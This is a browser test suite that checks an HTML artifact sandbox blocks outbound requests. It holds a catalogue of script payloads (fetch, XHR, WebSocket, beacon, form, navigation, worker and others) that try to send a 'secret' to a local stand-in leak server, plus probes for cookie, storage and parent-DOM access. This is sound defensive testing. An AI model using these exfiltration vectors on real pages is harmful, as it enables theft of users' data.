// A trusted HTML file's scripts run in an opaque-origin sandbox and can reach nothing (#14730, design v3, Security's conditions). Real Chrome against an isolated Coral: the file is run through the real
// artifact_scripts.js and /static/artifact_host.html, and a counting server on 127.0.0.1 must see ZERO hits from every vector (fetch, XHR, WebSocket, window.open, top.location, form, remote image, ...).
// The file's own probe writes what it could reach into its page, read here through the debugger (the file has no way to tell the page anything). The suite is MUTATION-CHECKED like the panel suite: with the
// sandbox, the child's policy or the host's frame-src weakened, it must fail.
const assert = require('node:assert/strict');
const http = require('node:http');
const CDP = require('chrome-remote-interface');
const base = require('./test_base').BASE;
(async () => {
    const hits = [];
    const counting = http.createServer((req, res) => { hits.push(req.method + ' ' + req.url); res.writeHead(200, { 'Content-Type': 'text/html', 'Access-Control-Allow-Origin': '*' }).end('<h1>exfil</h1>'); });
    await new Promise(r => counting.listen(0, '127.0.0.1', r));
    const URLX = `http://127.0.0.1:${counting.address().port}/leak?d=secret`;
    const WSX = `ws://127.0.0.1:${counting.address().port}/ws`;
    const hostSrc = await (await fetch(base + '/static/artifact_host.html')).text();
    const mutants = {
        'both frames get allow-same-origin': hostSrc.replace("f.setAttribute('sandbox', 'allow-scripts')", "f.setAttribute('sandbox', 'allow-scripts allow-same-origin')"),
        'file loses its csp': hostSrc.replace(/<meta http-equiv="Content-Security-Policy"[^>]*>/, '').replace("f.setAttribute('csp', CHILD_CSP);", '').replace("content=\"' + CHILD_CSP + '\">", "content=\"default-src * \\'unsafe-inline\\'\">"),
        'host loses frame-src about:': hostSrc.replace(/<meta http-equiv="Content-Security-Policy"[^>]*>/, '').replace(/f\.addEventListener\('load'[^\n]*\n/, ''),
    };
    for (const [n, doc] of Object.entries(mutants)) assert.notEqual(doc, hostSrc, 'the mutant "' + n + '" changed something');
    const mutantServer = http.createServer((req, res) => { res.writeHead(200, { 'Content-Type': 'text/html' }).end(mutants[decodeURIComponent(req.url.slice(1))] || 'x'); });
    await new Promise(r => mutantServer.listen(0, '127.0.0.1', r));
    const mutantUrl = n => `http://127.0.0.1:${mutantServer.address().port}/${encodeURIComponent(n)}`;

    const c = await CDP({ port: Number(process.env.CDP_PORT || 9222) });
    const ev = async expression => {
        const r = await c.Runtime.evaluate({ expression, returnByValue: true, awaitPromise: true });
        if (r.exceptionDetails) throw Error(r.exceptionDetails.exception?.description || r.exceptionDetails.text);
        return r.result.value;
    };
    const sleep = ms => new Promise(r => setTimeout(r, ms));
    const vectors = {
        'location.href': u => `location.href='${u}'`,
        'location.replace': u => `document.location.replace('${u}')`,
        'meta refresh': u => `document.head.insertAdjacentHTML('beforeend', '<meta http-equiv="refresh" content="0;url=${u}">')`,
        'window.open': u => `window.open('${u}')`,
        'form submit': u => `document.body.insertAdjacentHTML('beforeend','<form id="f" action="${u}" method="get"><input name="x" value="1"></form>'); document.getElementById('f').submit()`,
        'link click': u => `document.body.insertAdjacentHTML('beforeend','<a id="a" href="${u}">x</a>'); document.getElementById('a').click()`,
        'link target blank': u => `document.body.insertAdjacentHTML('beforeend','<a id="a" target="_blank" href="${u}">x</a>'); document.getElementById('a').click()`,
        'parent.location': u => `try { parent.location = '${u}'; } catch (e) {}`,
        'top.location': u => `try { top.location = '${u}'; } catch (e) {}`,
        'iframe src': u => `document.body.insertAdjacentHTML('beforeend','<iframe src="${u}"></iframe>')`,
        'img src': u => `new Image().src='${u}'`,
        'css url()': u => `document.body.insertAdjacentHTML('beforeend','<style>body{background:url(${u})}</style>')`,
        'fetch': u => `fetch('${u}', {mode:'no-cors'}).catch(function(){})`,
        'fetch with credentials': u => `fetch('${u}', {credentials:'include'}).catch(function(){})`,
        'sendBeacon': u => `navigator.sendBeacon('${u}', 'x')`,
        'xhr': u => `var x=new XMLHttpRequest();x.open('GET','${u}');x.send()`,
        'WebSocket': (u, w) => `try { new WebSocket('${w}') } catch (e) {}`,
        'EventSource': u => `try { new EventSource('${u}') } catch (e) {}`,
        'dynamic import': u => `try { import('${u}').catch(function(){}) } catch (e) {}`,
        'worker from blob': u => `try { var w = new Worker(URL.createObjectURL(new Blob(["fetch('${u}')"]))); } catch (e) {}`,
        'link prefetch': u => `document.head.insertAdjacentHTML('beforeend','<link rel="prefetch" href="${u}"><link rel="stylesheet" href="${u}"><link rel="preconnect" href="${u.split('/leak')[0]}">')`,
        'script src': u => `var s=document.createElement('script'); s.src='${u}'; document.head.appendChild(s)`,
        'object/embed': u => `document.body.insertAdjacentHTML('beforeend','<object data="${u}"></object><embed src="${u}">')`,
        'postMessage to top': () => `try { top.postMessage({ type: 'coral-artifact-load', html: '<script>1<\\/script>' }, '*'); parent.postMessage({ type: 'coral-ui-event', action: 'x', requestId: 'r', payload: {} }, '*'); } catch (e) {}`,
    };
    const names = Object.keys(vectors);

    await c.Page.enable();
    await c.Page.navigate({ url: base }); await c.Page.loadEventFired();
    await ev(`(async () => {
        const m = await import((window.__coralStatic||'/static/')+'artifact_scripts.js');
        window.as = m; window.runs = []; window.stray = [];
        window.addEventListener('message', e => { const r = window.runs.find(x => x.frame.contentWindow === e.source); if (!r) { window.stray.push(e.data && e.data.type); return; } if (e.data && e.data.type === 'coral-artifact-navigated') r.navigated = true; else if (!e.data || !['coral-artifact-host-ready', 'coral-artifact-height'].includes(e.data.type)) r.unexpected = e.data && e.data.type; });
        window.runFile = (name, html, hostUrl, outerSandbox) => {
            const wrapper = document.createElement('div'); document.body.appendChild(wrapper);
            const frame = m.drawScripted(wrapper, { html, name, turnOff() {} });
            if (outerSandbox) frame.setAttribute('sandbox', outerSandbox); if (hostUrl) frame.src = hostUrl;
            window.runs.push({ name, frame, wrapper });
        };
        window.clearRuns = () => { for (const r of window.runs) { r.frame.coralDetach && r.frame.coralDetach(); r.wrapper.remove(); } window.runs.length = 0; };
    })()`);

    // what the file could reach, written into its own page; read through the debugger (host target -> its child frame)
    const probe = `(function(){
  var out = {}; function done() { document.body.setAttribute('data-probe', JSON.stringify(out)); document.title = 'done'; }
  try { parent.document.title; out.parentDom = 'reachable'; } catch (e) { out.parentDom = 'blocked'; }
  try { top.document.title; out.topDom = 'reachable'; } catch (e) { out.topDom = 'blocked'; }
  try { localStorage.getItem('x'); out.storage = 'reachable'; } catch (e) { out.storage = 'blocked'; }
  try { sessionStorage.getItem('x'); out.session = 'reachable'; } catch (e) { out.session = 'blocked'; }
  try { void document.cookie; out.cookie = 'reachable'; } catch (e) { out.cookie = 'blocked'; }
  try { indexedDB.open('x'); out.idb = 'reachable'; } catch (e) { out.idb = 'blocked'; }
  out.cspFetch = 'untested';
  fetch(${JSON.stringify(URLX)}, {mode:'no-cors'}).then(function(){ out.cspFetch = 'allowed'; }, function(){ out.cspFetch = 'blocked'; }).then(done);
})();`;
    const page = body => `<h1>file</h1><script>${body}</script>`;
    const readProbe = async (hostMatch) => {
        const { targetInfos } = await c.Target.getTargets();
        const host = targetInfos.find(t => t.type === 'iframe' && hostMatch(t.url));
        if (!host) return null;
        const { sessionId } = await c.Target.attachToTarget({ targetId: host.targetId, flatten: true });
        try {
            await c.send('Page.enable', {}, sessionId);
            const { frameTree } = await c.send('Page.getFrameTree', {}, sessionId);
            const child = (frameTree.childFrames || [])[0];
            if (!child) return null;
            const { executionContextId } = await c.send('Page.createIsolatedWorld', { frameId: child.frame.id, worldName: 'probe' }, sessionId);
            const r = await c.send('Runtime.evaluate', { contextId: executionContextId, expression: `document.body.getAttribute('data-probe')`, returnByValue: true }, sessionId);
            return r.result.value ? JSON.parse(r.result.value) : null;
        } finally { await c.Target.detachFromTarget({ sessionId }).catch(() => {}); }
    };
    const leaksOf = async (hostUrl, label, outerSandbox, hostMatch) => {
        const leaks = [];
        await ev(`window.runFile(${JSON.stringify('probe-' + label)}, ${JSON.stringify(page(probe))}, ${JSON.stringify(hostUrl || '')}, ${JSON.stringify(outerSandbox || '')})`);
        let pr = null; for (let i = 0; i < 120 && !pr; i++) { await sleep(50); pr = await readProbe(hostMatch); }
        if (!pr) leaks.push('the file never ran (no probe): zero hits would mean nothing');
        else for (const k of ['parentDom', 'topDom', 'storage', 'session', 'cookie', 'idb', 'cspFetch']) if (pr[k] !== 'blocked') leaks.push(k + '=' + pr[k]);
        await ev(`window.clearRuns()`);
        const before = hits.length;
        for (let i = 0; i < names.length; i++) await ev(`window.runFile(${JSON.stringify(label + ':' + names[i])}, ${JSON.stringify(page(vectors[names[i]](URLX + '&v=' + i, WSX + '?v=' + i)))}, ${JSON.stringify(hostUrl || '')}, ${JSON.stringify(outerSandbox || '')})`);
        await sleep(2500); // sleep-ok: a negative: the file's requests would have reached the listener within this window
        for (const h of hits.slice(before)) leaks.push('"' + (names[Number((h.match(/[?&]v=(\d+)/) || [])[1])] || h) + '" reached the counting server');
        const seen = await ev(`({ stray: window.stray.slice(), unexpected: window.runs.map(r => r.unexpected).filter(Boolean) })`);
        if (seen.unexpected.length) leaks.push('an unexpected message type reached the page: ' + seen.unexpected.join(','));
        // (a message the file posts straight at the dashboard arrives with the FILE's window as its source, no frame of ours: artifact_scripts.js acts only on its own host frame's messages, so it is ignored; seen.stray only shows it was refused)
        await ev(`window.clearRuns(); window.stray.length = 0`);
        return leaks;
    };
    try {
        const real = await leaksOf('', 'real', '', u => /\/static\/artifact_host\.html/.test(u));
        assert.deepEqual(real, [], 'the real host leaks: ' + JSON.stringify(real));
        assert.deepEqual(hits, [], 'no request left any file: ' + JSON.stringify(hits.slice(0, 5)));
        // a file's height requests: the first is obeyed up to the window's height, the ones that follow at once are ignored (one every 250 ms), whatever number they carry
        {
            await ev(`window.runFile('height', ${JSON.stringify(page("parent.postMessage({ type: 'coral-artifact-height', height: 99999 }, '*'); parent.postMessage({ type: 'coral-artifact-height', height: 130 }, '*');"))}, '', '')`);
            let px = ''; for (let i = 0; i < 120 && !px; i++) { await sleep(50); px = await ev(`window.runs[window.runs.length - 1].frame.style.minHeight`); }
            const inner = await ev(`window.innerHeight`);
            assert.equal(px, `${Math.max(240, inner)}px`, 'the first height was capped to the window and the one right after it was ignored');
            await ev(`window.clearRuns()`);
        }
        // the file may only ask for a height: a forged load, an oversized one and a wrong type are ignored by the host; a clamped height is the one thing relayed
        for (const n of Object.keys(mutants)) {
            hits.length = 0;
            const leaks = await leaksOf(mutantUrl(n), 'mut', n.startsWith('both frames') ? 'allow-scripts allow-same-origin' : '', u => u.includes(String(mutantServer.address().port)));
            assert.ok(leaks.length > 0 || hits.length > 0, `the suite did NOT notice the weakened host "${n}": it would pass a broken sandbox`);
            console.log(`  mutant "${n}": caught (${leaks.length} leaks, ${hits.length} hits)`);
        }
        console.log(`artifact_scripts_sandbox_browser.test.js: ok (${names.length} vectors + probes, 0 hits on the real host; ${Object.keys(mutants).length} mutants all caught)`);
    } finally { await c.close(); for (const s of [counting, mutantServer]) { s.closeAllConnections(); s.close(); } }
})().catch(e => { console.error(e); process.exit(1); });
